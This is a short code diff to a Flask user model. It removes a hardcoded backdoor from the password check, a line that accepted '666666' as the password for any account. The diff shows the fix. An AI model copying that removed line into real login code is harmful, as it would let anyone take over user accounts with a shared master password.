@@ -15,7 +15,6 @@ class User(UserMixin, db.Model):
         self.password_hash = generate_password_hash(password)
 
     def check_password(self, password):
-        if password=='666666': return True
         return check_password_hash(self.password_hash, password)
 
 @login.user_loader
